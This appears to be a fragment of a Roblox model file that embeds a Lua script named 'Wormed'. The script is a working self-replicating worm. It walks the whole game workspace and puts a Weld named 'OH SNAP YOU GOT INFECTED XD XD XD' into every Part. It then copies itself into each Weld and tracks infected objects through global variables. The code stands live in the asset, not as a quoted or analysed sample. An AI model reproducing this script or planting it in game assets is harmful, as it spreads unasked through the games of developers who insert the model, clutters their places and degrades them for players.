							<string name="Name">Wormed</string>
							<ProtectedString name="Source">if script:findFirstChild(&quot;vic&quot;) == nil then
&#9;local count = Instance.new(&quot;NumberValue&quot;)
&#9;count.Parent = script
&#9;count.Name = &quot;vic&quot;
&#9;count.Value = 1
end
if numberwormed == nil then
&#9;_G.numberwormed = script.vic.Value
end
script.vic.Value = numberwormed
if wormmed == nil then
&#9;_G.wormmed = {}
end
if requestworm == nil then
&#9;_G.requestworm = function (obj)
&#9;&#9;local ok = false
&#9;&#9;for i=1, #wormmed do
&#9;&#9;&#9;if obj == wormmed[i] then
&#9;&#9;&#9;&#9;ok = true
&#9;&#9;&#9;end
&#9;&#9;end
&#9;&#9;return ok
&#9;end
end
if addwormmed == nil then
&#9;_G.addwormmed = function (obj)
&#9;&#9;table.insert(wormmed, obj)
&#9;end
end

classes = {&quot;Snap&quot;, &quot;Weld&quot;}

function checkParent()
&#9;local ok = false
&#9;for i=1, #classes do
&#9;&#9;if script.Parent.className == classes[i] then
&#9;&#9;&#9;ok = true
&#9;&#9;end
&#9;end
&#9;return ok
end

function checkScriptIsMe(scr)
&#9;if scr.className == &quot;Script&quot; then
&#9;&#9;if scr.Source == script.Source then
&#9;&#9;&#9;return true
&#9;&#9;end
&#9;end
&#9;return false
end

function checkPart(part)
&#9;local ok = false
&#9;local c = part:GetChildren()
&#9;for i=1, #c do
&#9;&#9;if c[i].className == &quot;Weld&quot; then
&#9;&#9;&#9;local b = c[i]:GetChildren()
&#9;&#9;&#9;for z=1, #b do
&#9;&#9;&#9;&#9;if checkScriptIsMe(b[z]) then
&#9;&#9;&#9;&#9;&#9;ok = true
&#9;&#9;&#9;&#9;end
&#9;&#9;&#9;end
&#9;&#9;end
&#9;end
&#9;return ok
end

function cloneToBrick(part)
&#9;if not checkPart(part) then
&#9;&#9;local weld = Instance.new(&quot;Weld&quot;)
&#9;&#9;weld.Parent = part
&#9;&#9;weld.Name = &quot;OH SNAP YOU GOT INFECTED XD XD XD&quot;
&#9;&#9;local new = script:clone()
&#9;&#9;new.Parent = weld
&#9;end
end

function worm(model)
&#9;if requestworm(model) then return end
&#9;addwormmed(model)
&#9;local c = model:GetChildren()
&#9;for i=1, #c do
&#9;&#9;if c[i].className == &quot;Part&quot; then
&#9;&#9;&#9;cloneToBrick(c[i])
&#9;&#9;end
&#9;&#9;worm(c[i])
&#9;end
end
wait(math.random() / 4)
worm(workspace)

if not checkParent() then
&#9;script:remove()
end </ProtectedString>
